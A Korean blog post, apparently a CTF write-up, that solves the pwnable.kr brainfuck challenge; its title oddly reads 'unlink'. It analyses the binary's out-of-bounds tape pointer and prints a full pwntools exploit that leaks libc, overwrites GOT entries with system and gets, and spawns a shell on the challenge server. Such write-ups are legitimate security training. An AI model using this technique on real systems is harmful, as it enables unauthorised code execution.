---
layout: post
title: ! "[pwnable.kr] unlink"
excerpt_separator: <!--more-->
comments : true
tags:
  - pwnable
  - brainfuck
  - memory
  - chaem
---

오늘은 `pwnable.kr` Rookiss의 첫번째 문제인 `brain fuck`문제를 풀어볼까해요!  
brainfuck은 memory leak과 관련되 문제입니다.  

<!--more-->

brainfuck이 실제 컴퓨터 프로그래밍 언어였네요! 신기신기*.*  
자세한 내용은 위키에서 확인하세용 ㅎㅎ  

```
[brainfuck위키](https://ko.wikipedia.org/wiki/%EB%B8%8C%EB%A0%88%EC%9D%B8%ED%8D%BD)  
```

우선, 바이너리의 보호기법을 확인해 보겠습니다.  
32bit 바이너리이고, canary와 nx가 걸려있네요~  

```
pwndbg> checksec
[*] Checking for new versions of pwntools
    To disable this functionality, set the contents of /home/ubuntu/.pwntools-cache/update to 'never'.
[*] You have the latest version of Pwntools (3.12.0)
[*] '/home/ubuntu/pwnable_kr/brain/bf'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

바이너리를 실행해보면, 다음과 같이 값을 입력받고 프로그램을 종료합니다.  

```
ubuntu@ubuntu:~$ nc pwnable.kr 9001
welcome to brainfuck testing system!!
type some brainfuck instructions except [ ]
aaa
```

```
ubuntu@ubuntu:~$ nc pwnable.kr 9001
welcome to brainfuck testing system!!
type some brainfuck instructions except [ ]
[]
[ and ] not supported.
```

[]를 입력해 보았더니, `[` 와 `]` 는 지원하지 않는다고 하네요.  

이렇게만 알 수 있는 것은 딱히 없어보이니, 바이너리를 분석해봅시다.  
main함수는 다음과 같습니다.  

```c

int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax@4
  int v4; // edx@4
  size_t i; // [sp+28h] [bp-40Ch]@1
  int v6; // [sp+2Ch] [bp-408h]@1
  int v7; // [sp+42Ch] [bp-8h]@1

  v7 = *MK_FP(__GS__, 20);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  p = (int)&tape;
  puts("welcome to brainfuck testing system!!");
  puts("type some brainfuck instructions except [ ]");
  memset(&v6, 0, 0x400u);
  fgets((char *)&v6, 1024, stdin);
  for ( i = 0; i < strlen((const char *)&v6); ++i )
    do_brainfuck(*((_BYTE *)&v6 + i));
  result = 0;
  v4 = *MK_FP(__GS__, 20) ^ v7;
  return result;
}

```

do_brainfuck 함수에서는 넘겨받은 글자를 아스키코드로 비교하여 실행하고 있습니다.  
ida로 보면, 각 문자들이 어떤 역할을 수행하는 지 알 수 있습니다.  

```c
int __cdecl do_brainfuck(char a1)
{
  int result; // eax@1
  _BYTE *v2; // ebx@7

  result = a1;
  switch ( a1 )
  {
    case '>':
      result = p++ + 1;
      break;
    case '<':
      result = p-- - 1;
      break;
    case '+':
      result = p;
      ++*(_BYTE *)p;
      break;
    case '-':
      result = p;
      --*(_BYTE *)p;
      break;
    case '.':
      result = putchar(*(_BYTE *)p);
      break;
    case ',':
      v2 = (_BYTE *)p;
      result = getchar();
      *v2 = result;
      break;
    case '[':
      result = puts("[ and ] not supported.");
      break;
    default:
      return result;
  }
  return result;
}
```

main함수에서 p는 tape 변수의 주소를 가리키는 값입니다. 따라서 우리는 do_brainfuck 함수에서 p를 원하는대로 조작할 수 있습니다.  
do_brainfuck함수를 보면 딱 memory leak을 할 수 있다는 것이 보인다고 하네요...:(
우선 tape의 주소는 다음과 같습니다.  

```
.bss:0804A0A0 tape
```

이제 어떻게 shell을 실행시킬 수 있는지 생각해 보아야 하는데요, >,<를 이용해 메모리 값을 변경할 수 있고, getchar(), putchar()와 같은 명령을 사용할 수 있다는 것을 이용해 봅시다.  
위에서 봤던 main함수에서 있는 memset과 fgets의 got를 조작하여 shell을 실행시킬 수 있을 것이라 예상됩니다.  
memset의 got를 gets로 조작하여 /bin/sh를 입력하고, fgets의 got를 system으로 조작하고, putchar의 got를 main으로 조작하여 putchar를 실행시키면 될 것 입니다.  
`objdump -S bf` 이 명령어를 이용하여 plt값들을 알 수 있습니다.  

```
Disassembly of section .plt:

08048430 <getchar@plt-0x10>:
 8048430:	ff 35 04 a0 04 08    	pushl  0x804a004
 8048436:	ff 25 08 a0 04 08    	jmp    *0x804a008
 804843c:	00 00                	add    %al,(%eax)
	...

08048440 <getchar@plt>:
 8048440:	ff 25 0c a0 04 08    	jmp    *0x804a00c
 8048446:	68 00 00 00 00       	push   $0x0
 804844b:	e9 e0 ff ff ff       	jmp    8048430 <_init+0x24>

08048450 <fgets@plt>:
 8048450:	ff 25 10 a0 04 08    	jmp    *0x804a010
 8048456:	68 08 00 00 00       	push   $0x8
 804845b:	e9 d0 ff ff ff       	jmp    8048430 <_init+0x24>

08048460 <__stack_chk_fail@plt>:
 8048460:	ff 25 14 a0 04 08    	jmp    *0x804a014
 8048466:	68 10 00 00 00       	push   $0x10
 804846b:	e9 c0 ff ff ff       	jmp    8048430 <_init+0x24>

08048470 <puts@plt>:
 8048470:	ff 25 18 a0 04 08    	jmp    *0x804a018
 8048476:	68 18 00 00 00       	push   $0x18
 804847b:	e9 b0 ff ff ff       	jmp    8048430 <_init+0x24>

08048480 <__gmon_start__@plt>:
 8048480:	ff 25 1c a0 04 08    	jmp    *0x804a01c
 8048486:	68 20 00 00 00       	push   $0x20
 804848b:	e9 a0 ff ff ff       	jmp    8048430 <_init+0x24>

08048490 <strlen@plt>:
 8048490:	ff 25 20 a0 04 08    	jmp    *0x804a020
 8048496:	68 28 00 00 00       	push   $0x28
 804849b:	e9 90 ff ff ff       	jmp    8048430 <_init+0x24>

080484a0 <__libc_start_main@plt>:
 80484a0:	ff 25 24 a0 04 08    	jmp    *0x804a024
 80484a6:	68 30 00 00 00       	push   $0x30
 80484ab:	e9 80 ff ff ff       	jmp    8048430 <_init+0x24>

080484b0 <setvbuf@plt>:
 80484b0:	ff 25 28 a0 04 08    	jmp    *0x804a028
 80484b6:	68 38 00 00 00       	push   $0x38
 80484bb:	e9 70 ff ff ff       	jmp    8048430 <_init+0x24>

080484c0 <memset@plt>:
 80484c0:	ff 25 2c a0 04 08    	jmp    *0x804a02c
 80484c6:	68 40 00 00 00       	push   $0x40
 80484cb:	e9 60 ff ff ff       	jmp    8048430 <_init+0x24>

080484d0 <putchar@plt>:
 80484d0:	ff 25 30 a0 04 08    	jmp    *0x804a030
 80484d6:	68 48 00 00 00       	push   $0x48
 80484db:	e9 50 ff ff ff       	jmp    8048430 <_init+0x24>
```

exploit은 다음과 같습니다.  

```python
from pwn import *

libc = ELF('./bf_libc.so')

s = remote('pwnable.kr', 9001)
s.recvline_startswith('type')

payload = '<' * (0x0804A0A0 - 0x0804A010)
payload += '.>' * 4 #read fget@plt address
payload += '<' * 4 #move to start of fget@plt
payload += ',>' * 4 #overwrite fget@plt to system()
payload += '>' * (0x0804A02C - 0x0804A014)
payload += ',>' * 4 #overwrite memset to gets
payload += ',>' * 4 #overwrite putchar to main
payload += '.' #execute main function

s.sendline(payload)

fgets_addr = s.recvn(4)[::-1].encode('hex')
system_addr = int(fgets_addr, 16) - libc.symbols['fgets'] + libc.symbols['system']
gets_addr = int(fgets_addr, 16) - libc.symbols['fgets'] + libc.symbols['gets']

s.send(p32(system_addr))
s.send(p32(gets_addr))
s.send(p32(0x08048671))
s.sendline('/bin/sh\00')
s.interactive()
```
